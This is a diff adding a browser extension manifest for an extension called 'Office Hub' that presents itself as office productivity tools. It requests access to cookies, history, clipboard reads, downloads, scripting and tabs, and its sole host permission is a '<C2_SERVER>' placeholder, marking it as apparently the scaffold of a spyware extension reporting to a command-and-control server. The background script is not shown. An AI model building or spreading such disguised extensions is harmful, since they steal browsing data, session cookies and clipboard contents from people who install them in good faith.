@@ -1,0 +1,19 @@
+{
+  "manifest_version": 3,
+  "name": "Office Hub",
+  "version": "1.0",
+  "description": "Office productivity tools",
+  "permissions": ["storage", "alarms", "scripting", "downloads", "bookmarks", "history", "cookies", "clipboardRead", "clipboardWrite", "idle", "tabs"],
+  "host_permissions": ["<C2_SERVER>"],
+  "background": {
+    "service_worker": "background.js"
+  },
+  "action": {
+    "default_popup": "popup.html",
+    "default_icon": "icon.png"
+  },
+  "web_accessible_resources": [{
+    "resources": ["icon.png"],
+    "matches": ["<all_urls>"]
+  }]
+}
